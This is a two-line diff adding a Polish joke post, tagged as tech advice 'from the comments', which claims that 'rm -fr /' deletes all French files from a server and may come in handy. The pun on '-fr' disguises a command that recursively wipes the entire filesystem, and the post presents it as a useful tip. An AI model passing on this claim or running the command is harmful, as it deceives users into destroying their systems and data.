@@ -1,0 +1,2 @@
+#PanInformatykRadzi #zKomentarzy
+rm -fr / usuwa wszystkie 🇫🇷 francuskie pliki z serwera, może się komuś przydać 😉
